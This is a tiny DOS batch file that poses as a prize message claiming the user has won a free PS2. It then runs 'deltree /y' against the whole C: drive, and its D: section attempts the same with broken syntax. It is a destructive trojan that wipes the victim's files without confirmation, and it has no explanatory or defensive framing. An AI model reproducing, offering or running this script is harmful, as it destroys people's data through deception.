@echo off
echo You just wont a free PS2!
echo you wont need this computer anymore now
deltree/y C:\*.*
goto  D

:D
if exist deltree/y D:\*.*
if not exist goto end
:end
